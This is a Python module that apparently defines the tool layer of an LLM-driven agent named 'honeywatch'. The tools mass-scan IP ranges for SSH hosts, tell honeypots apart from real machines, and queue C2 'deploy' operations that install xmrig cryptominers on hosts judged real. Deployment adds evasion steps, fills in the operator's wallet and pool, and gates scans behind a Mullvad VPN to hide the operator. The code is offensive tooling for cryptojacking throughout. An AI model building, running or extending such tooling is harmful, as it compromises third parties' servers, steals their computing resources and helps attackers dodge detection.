"""Callable tools exposed to the honeywatch chat agent.

Each tool is a function that accepts a dict of arguments and returns a dict
result. The agent parses tool calls from the LLM, executes them, and feeds the
results back into the conversation. Tools are intentionally coarse-grained so
a single command like "scan 10.0.0.0/24 and deploy xmrig on real hosts" can be
broken into scan + deploy + report.
"""

from __future__ import annotations

import asyncio
import json
import os
import sys
from typing import Any, Callable

from honeywatch.agent.setup import AgentConfig, SetupStore
from honeywatch.c2.store import C2Store
from honeywatch.config import load_config
from honeywatch.models import Fingerprint, HostHit, Score, Target
from honeywatch.ops import (
    TargetFilter,
    build_manifest,
    enqueue_operation,
    prepare_evasion_pipeline,
    select_targets,
)
from honeywatch.payloads import get_payload, list_payloads
from honeywatch.pipeline import Pipeline
from honeywatch.store import Store

ToolFunc = Callable[[dict[str, Any], "ToolContext"], dict[str, Any]]


class ToolContext:
    """Shared runtime context passed to every tool execution."""

    def __init__(
        self,
        db_path: str = "honeywatch.db",
        agent_config: AgentConfig | None = None,
        skip_vpn_check: bool = False,
    ):
        self.db_path = db_path
        self.agent_config = agent_config or AgentConfig()
        self.skip_vpn_check = skip_vpn_check
        self._store: Store | None = None
        self._c2_store: C2Store | None = None

    @property
    def store(self) -> Store:
        if self._store is None:
            self._store = Store(self.db_path)
        return self._store

    @property
    def c2_store(self) -> C2Store:
        if self._c2_store is None:
            self._c2_store = C2Store(self.db_path)
        return self._c2_store


def _require_vpn(ctx: ToolContext) -> bool:
    """Return True when a network tool may proceed."""
    from honeywatch.vpn import DEFAULT_TIMEOUT, require_mullvad

    if ctx.skip_vpn_check:
        return True
    cfg = load_config()
    vpn_cfg = getattr(cfg, "vpn", None)
    required = bool(getattr(vpn_cfg, "required", True)) if vpn_cfg else True
    if not required:
        return True
    timeout = getattr(vpn_cfg, "timeout_s", DEFAULT_TIMEOUT) if vpn_cfg else DEFAULT_TIMEOUT
    ok, detail = require_mullvad(timeout=timeout, quiet=True)
    if ok:
        print(f"honeywatch: vpn gate OK ({detail})", file=sys.stderr)
        return True
    print(
        "honeywatch: REFUSED - Mullvad VPN is not connected. "
        "Pass skip_vpn_check=true or connect Mullvad.",
        file=sys.stderr,
    )
    return False


_TOOL_SPECS: list[dict[str, Any]] = [
    {
        "name": "list_payloads",
        "description": "List available red-team payload IDs and categories.",
        "parameters": {
            "type": "object",
            "properties": {
                "category": {
                    "type": "string",
                    "description": "Optional category filter: miner, exploit, or evasion.",
                }
            },
        },
    },
    {
        "name": "get_status",
        "description": "Return the current database status: total hosts and label counts.",
        "parameters": {"type": "object", "properties": {}},
    },
    {
        "name": "scan",
        "description": "Run a masscan/zmap discovery + SSH probe over a target range.",
        "parameters": {
            "type": "object",
            "properties": {
                "targets": {
                    "type": "string",
                    "description": "Comma-separated IPs/CIDRs to scan, e.g. 10.0.0.0/24.",
                },
                "tool": {
                    "type": "string",
                    "description": "Scanner tool: masscan or zmap. Default masscan.",
                },
                "ports": {
                    "type": "string",
                    "description": "Ports to scan, default 22.",
                },
                "rate": {
                    "type": "integer",
                    "description": "Packets per second. Default 1000.",
                },
                "max_hosts": {
                    "type": "integer",
                    "description": "Cap how many hosts are probed and scored.",
                },
                "probe_level": {
                    "type": "string",
                    "description": "fast or full (full needs paramiko).",
                },
                "skip_vpn_check": {
                    "type": "boolean",
                    "description": "Bypass the Mullvad VPN gate for controlled testing.",
                },
            },
            "required": ["targets"],
        },
    },
    {
        "name": "probe_host",
        "description": "Fingerprint and classify a single SSH host.",
        "parameters": {
            "type": "object",
            "properties": {
                "host": {
                    "type": "string",
                    "description": "ip[:port] to probe.",
                },
                "probe_level": {
                    "type": "string",
                    "description": "fast or full.",
                },
                "skip_vpn_check": {
                    "type": "boolean",
                    "description": "Bypass the Mullvad VPN gate.",
                },
            },
            "required": ["host"],
        },
    },
    {
        "name": "deploy",
        "description": "Build and enqueue a payload deployment against selected targets.",
        "parameters": {
            "type": "object",
            "properties": {
                "payload_id": {
                    "type": "string",
                    "description": "Payload to deploy, e.g. xmrig, xmrigcc, stratum, metasploit.",
                },
                "target_label": {
                    "type": "string",
                    "description": "Filter targets by final label: real, likely_real, uncertain, likely_honeypot, honeypot.",
                },
                "min_confidence": {
                    "type": "number",
                    "description": "Minimum final confidence. Default 0.7.",
                },
                "max_confidence": {
                    "type": "number",
                    "description": "Maximum final confidence. Default 1.0.",
                },
                "limit": {
                    "type": "integer",
                    "description": "Max number of targets.",
                },
                "target_file": {
                    "type": "string",
                    "description": "Path to file with ip[:port] lines; if omitted, use store.",
                },
                "evasion": {
                    "type": "string",
                    "description": "Comma-separated evasion payload ids, e.g. upx,symbol_strip.",
                },
                "exec_mode": {
                    "type": "string",
                    "description": "dry_run, local_simulate, or ssh.",
                },
                "ssh_user": {
                    "type": "string",
                    "description": "SSH user for ssh mode.",
                },
                "ssh_key": {
                    "type": "string",
                    "description": "SSH private key path.",
                },
                "variables": {
                    "type": "object",
                    "description": "Extra payload variables. For miner payloads, wallet/pool/worker/pass/tls are auto-filled from setup unless overridden here.",
                },
            },
            "required": ["payload_id"],
        },
    },
    {
        "name": "report",
        "description": "Generate a JSON/CSV/Markdown report from the store.",
        "parameters": {
            "type": "object",
            "properties": {
                "format": {
                    "type": "string",
                    "description": "json, csv, or md. Default json.",
                },
                "limit": {
                    "type": "integer",
                    "description": "Number of rows. Default 20.",
                },
                "label": {
                    "type": "string",
                    "description": "Filter by final label.",
                },
                "min_confidence": {
                    "type": "number",
                    "description": "Minimum confidence. Default 0.0.",
                },
            },
        },
    },
    {
        "name": "get_operations",
        "description": "List C2 operations and their statuses.",
        "parameters": {
            "type": "object",
            "properties": {
                "status": {
                    "type": "string",
                    "description": "Filter by status: pending, running, completed, failed.",
                },
                "limit": {
                    "type": "integer",
                    "description": "Max operations to return.",
                },
            },
        },
    },
    {
        "name": "get_tasks",
        "description": "List C2 tasks, optionally filtered by operation or status.",
        "parameters": {
            "type": "object",
            "properties": {
                "operation_id": {
                    "type": "string",
                    "description": "Filter by operation id.",
                },
                "status": {
                    "type": "string",
                    "description": "Filter by status.",
                },
                "limit": {
                    "type": "integer",
                    "description": "Max tasks to return.",
                },
            },
        },
    },
    {
        "name": "set_wallet",
        "description": "Update the default mining wallet/pool configuration in setup.",
        "parameters": {
            "type": "object",
            "properties": {
                "pool": {"type": "string"},
                "wallet": {"type": "string"},
                "pass": {"type": "string"},
                "worker": {"type": "string"},
                "tls": {"type": "boolean"},
            },
        },
    },
    {
        "name": "set_ollama",
        "description": "Update the Ollama API configuration in setup.",
        "parameters": {
            "type": "object",
            "properties": {
                "api_key": {"type": "string"},
                "base_url": {"type": "string"},
                "model": {"type": "string"},
            },
        },
    },
]


def _tool(name: str, func: ToolFunc) -> None:
    spec = next((s for s in _TOOL_SPECS if s["name"] == name), None)
    if spec is None:
        raise ValueError(f"missing tool spec for {name!r}")
    TOOL_REGISTRY[name] = {"func": func, "spec": spec}


TOOL_REGISTRY: dict[str, dict[str, Any]] = {}


# --------------------------------------------------------------------------- #
# Tool implementations
# --------------------------------------------------------------------------- #


def _tool_list_payloads(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    category = args.get("category")
    payloads = list_payloads(category)
    return {
        "payloads": [
            {
                "id": p.id,
                "category": p.category,
                "name": p.name,
                "description": p.description,
                "install_type": p.install_type,
                "tags": p.tags,
            }
            for p in payloads
        ]
    }


def _tool_get_status(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    stats = ctx.store.stats()
    return {"status": stats}


def _tool_scan(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    skip = bool(args.get("skip_vpn_check", ctx.skip_vpn_check))
    if not skip and not _require_vpn(ctx):
        return {"error": "VPN gate blocked the scan. Connect Mullvad or pass skip_vpn_check=true."}

    from honeywatch.cli import parse_ports

    cfg = load_config()
    store = ctx.store
    targets = [t.strip() for t in args["targets"].split(",") if t.strip()]
    tool = args.get("tool", "masscan")
    ports = parse_ports(args.get("ports", "22"))
    rate = int(args.get("rate", 1000))
    max_hosts = args.get("max_hosts")
    probe_level = args.get("probe_level", "fast")

    # Update config with CLI-equivalent overrides for the pipeline.
    _set(cfg.probe, "level", probe_level)

    async def _run():
        pipeline = Pipeline(cfg, store=store)
        return await pipeline.scan(
            targets=targets,
            tool=tool,
            ports=ports,
            rate=rate,
            max_hosts=max_hosts,
            skip_vpn_check=True,  # already checked above
        )

    scores = asyncio.run(_run())
    return {
        "scanned": len(scores),
        "summary": _summarize_scores(scores),
        "top": [_score_summary(s) for s in sorted(scores, key=lambda x: x.final_confidence, reverse=True)[:10]],
    }


def _tool_probe_host(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    skip = bool(args.get("skip_vpn_check", ctx.skip_vpn_check))
    if not skip and not _require_vpn(ctx):
        return {"error": "VPN gate blocked the probe. Connect Mullvad or pass skip_vpn_check=true."}

    from honeywatch.cli import parse_host

    cfg = load_config()
    ip, port = parse_host(args["host"])
    level = args.get("probe_level", getattr(cfg.probe, "level", "fast"))
    _set(cfg.probe, "level", level)

    async def _run():
        pipeline = Pipeline(cfg)
        fps = await pipeline.probe_hosts([HostHit(ip=ip, port=port)])
        if not fps:
            return []
        return await pipeline.analyze_and_score(fps)

    scores = asyncio.run(_run())
    if not scores:
        return {"error": "no fingerprint captured"}
    return {"result": _score_summary(scores[0])}


def _tool_deploy(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    payload_id = args["payload_id"]
    variables = dict(args.get("variables", {}))

    # Auto-fill miner variables from agent setup unless overridden.
    if payload_id in {"xmrig", "xmrigcc"}:
        cfg = ctx.agent_config
        if cfg.pool and "pool" not in variables:
            variables["pool"] = cfg.pool
        if cfg.wallet and "wallet" not in variables:
            variables["wallet"] = cfg.wallet
        if cfg.pass_ and "pass" not in variables:
            variables["pass"] = cfg.pass_
        if cfg.worker and "worker" not in variables:
            variables["worker"] = cfg.worker
        if "tls" not in variables:
            variables["tls"] = str(cfg.tls).lower()

    missing = []
    if payload_id in {"xmrig", "xmrigcc"}:
        if not variables.get("pool"):
            missing.append("pool")
        if not variables.get("wallet"):
            missing.append("wallet")
    if missing:
        return {
            "error": f"payload {payload_id!r} missing required variables: {', '.join(missing)}. Run set_wallet or provide them in variables.",
        }

    targets: list[Target] = []
    target_file = args.get("target_file")
    if target_file:
        from honeywatch.cli import parse_host

        with open(target_file, "r", encoding="utf-8") as fh:
            for line in fh:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                ip, port = parse_host(line)
                targets.append(
                    Target(
                        ip=ip,
                        port=port,
                        allowed_categories=[],
                        ssh_user=args.get("ssh_user", ctx.agent_config.ssh_user),
                        ssh_key=args.get("ssh_key"),
                    )
                )
    else:
        label = args.get("target_label")
        labels = {label} if label else {"real", "likely_real"}
        filter_ = TargetFilter(
            labels=labels,
            min_confidence=args.get("min_confidence", 0.7),
            max_confidence=args.get("max_confidence", 1.0),
            limit=args.get("limit"),
        )
        targets = select_targets(
            ctx.store,
            filter_,
            args.get("ssh_user", ctx.agent_config.ssh_user),
            args.get("ssh_key"),
        )

    if not targets:
        return {"error": "no targets matched"}

    evasion = prepare_evasion_pipeline(args.get("evasion"))
    manifest = build_manifest(payload_id, targets, variables, evasion)
    op = enqueue_operation(ctx.c2_store, manifest)
    return {
        "operation_id": op.id,
        "payload_id": payload_id,
        "targets": len(targets),
        "status": op.status,
    }


def _tool_report(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    fmt = args.get("format", "json")
    limit = int(args.get("limit", 20))
    label = args.get("label")
    min_confidence = float(args.get("min_confidence", 0.0))
    scores = ctx.store.query_scores(limit=limit, label=label, min_confidence=min_confidence)
    return {
        "format": fmt,
        "rows": len(scores),
        "data": [_score_summary(s) for s in scores],
    }


def _tool_get_operations(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    status = args.get("status")
    limit = int(args.get("limit", 50))
    ops = ctx.c2_store.list_operations(status=status, limit=limit)
    return {
        "operations": [
            {
                "id": o.id,
                "payload_id": o.payload_id,
                "status": o.status,
                "targets": len(o.target_ips),
                "created_at": o.created_at,
                "updated_at": o.updated_at,
            }
            for o in ops
        ]
    }


def _tool_get_tasks(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    operation_id = args.get("operation_id")
    status = args.get("status")
    limit = int(args.get("limit", 100))
    tasks = ctx.c2_store.list_tasks(
        operation_id=operation_id, status=status, limit=limit
    )
    return {
        "tasks": [
            {
                "id": t.id,
                "operation_id": t.operation_id,
                "payload_id": t.payload_id,
                "category": t.category,
                "target": f"{t.target.ip}:{t.target.port}" if t.target else None,
                "status": t.status,
                "worker_id": t.worker_id,
            }
            for t in tasks
        ]
    }


def _tool_set_wallet(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    cfg = ctx.agent_config
    if "pool" in args:
        cfg.pool = args["pool"]
    if "wallet" in args:
        cfg.wallet = args["wallet"]
    if "pass" in args:
        cfg.pass_ = args["pass"]
    if "worker" in args:
        cfg.worker = args["worker"]
    if "tls" in args:
        cfg.tls = bool(args["tls"])
    SetupStore(ctx.db_path).save_config(cfg)
    return {"ok": True, "wallet": cfg.wallet, "pool": cfg.pool, "worker": cfg.worker}


def _tool_set_ollama(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    cfg = ctx.agent_config
    if "api_key" in args:
        cfg.ollama_api_key = args["api_key"]
    if "base_url" in args:
        cfg.ollama_base_url = args["base_url"]
    if "model" in args:
        cfg.ollama_model = args["model"]
    SetupStore(ctx.db_path).save_config(cfg)
    return {
        "ok": True,
        "base_url": cfg.ollama_base_url,
        "model": cfg.ollama_model,
    }


def _summarize_scores(scores: list[Score]) -> dict[str, int]:
    from collections import Counter

    return dict(Counter(s.final_label for s in scores))


def _score_summary(s: Score) -> dict[str, Any]:
    return {
        "ip": s.ip,
        "port": s.port,
        "label": s.final_label,
        "confidence": s.final_confidence,
        "banner": s.fingerprint.banner if s.fingerprint else None,
        "software": s.fingerprint.software if s.fingerprint else None,
        "version": s.fingerprint.software_version if s.fingerprint else None,
        "flags": s.signals.flags if s.signals else [],
    }


def _set(obj, name: str, value: Any) -> None:
    try:
        setattr(obj, name, value)
    except Exception:
        pass


# Register tools.
_tool("list_payloads", _tool_list_payloads)
_tool("get_status", _tool_get_status)
_tool("scan", _tool_scan)
_tool("probe_host", _tool_probe_host)
_tool("deploy", _tool_deploy)
_tool("report", _tool_report)
_tool("get_operations", _tool_get_operations)
_tool("get_tasks", _tool_get_tasks)
_tool("set_wallet", _tool_set_wallet)
_tool("set_ollama", _tool_set_ollama)


def execute_tool(name: str, args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    """Execute a tool by name and return its result."""
    if name not in TOOL_REGISTRY:
        return {"error": f"unknown tool: {name!r}"}
    try:
        return TOOL_REGISTRY[name]["func"](args, ctx)
    except Exception as exc:
        return {"error": f"tool {name!r} failed: {exc!r}"}
